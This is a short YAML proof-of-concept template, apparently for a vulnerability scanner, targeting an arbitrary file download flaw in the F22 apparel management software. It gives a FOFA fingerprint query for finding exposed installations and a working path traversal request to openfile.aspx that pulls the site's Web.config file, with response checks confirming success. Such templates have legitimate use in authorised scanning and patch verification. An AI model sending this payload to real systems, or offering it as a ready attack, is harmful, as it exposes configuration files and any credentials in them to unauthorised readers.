id: poc-yaml-f22-apparel-management-openfile-anyfile-download
info:
  name: F22服装管理软件系统 openfile.aspx 任意文件下载漏洞
  severity: high
  tags:
  - 文件读取
  finger: F22服装管理软件系统
  fofa: body="(images/login_c05-05.gif)"
requests:
- method: GET
  path: /oa/isprit/module/openfile.aspx?Url=..\..\..\Web.config
  expression: 'status_code == 200 &&

    contains(body,"<?xml version") &&

    contains(body,"<configuration>") &&

    contains(body,"<appSettings>") &&

    contains(body,"</system.web>") &&

    contains(headers,"application/x-config")

    '
variables: {}
transport: http
